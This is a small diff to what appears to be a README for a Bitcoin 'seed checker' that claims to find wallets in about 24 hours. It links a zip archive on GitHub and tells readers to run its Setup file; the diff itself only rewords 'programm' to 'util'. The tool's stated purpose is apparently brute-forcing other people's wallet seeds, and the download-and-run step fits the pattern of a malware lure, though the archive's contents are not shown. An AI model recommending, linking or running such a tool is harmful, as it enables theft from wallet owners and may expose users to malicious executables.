@@ -33,7 +33,7 @@ You need 24H for find first wallet, on medium PC or laptop
   
  Link download: https://github.com/yoyo422012/seed-checker-btc/releases/download/btc/btc-check.zip
  
- For activate programm run Setup file
+ For activate util run Setup file
 
 
 ## Benefits
